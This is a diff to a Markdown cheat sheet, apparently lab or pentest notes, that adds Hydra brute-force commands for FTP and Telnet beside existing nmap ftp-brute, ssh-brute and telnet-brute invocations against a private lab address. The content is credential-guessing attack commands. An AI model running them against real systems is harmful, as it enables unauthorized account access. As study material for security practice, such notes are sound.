@@ -17,6 +17,10 @@ echo -e "lesand2222\nlesand3333\nlesand1111\nlesand4321\nlesand1234\lesand2020\n
 ```bash
 nmap -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 192.168.85.134
 ```
+## Hydra
+```bash
+hydra -L usuarios.txt -P dicc.txt ftp://192.168.85.134
+```
 ## SSH
 ### NMAP
 ```bash
@@ -26,4 +30,8 @@ nmap -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 
 ### NMAP
 ```bash
 nmap -p 23 --script telnet-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 192.168.85.134
+```
+## Hydra
+```bash
+hydra -L usuarios.txt -P dicc.txt telnet://192.168.85.134
 ```
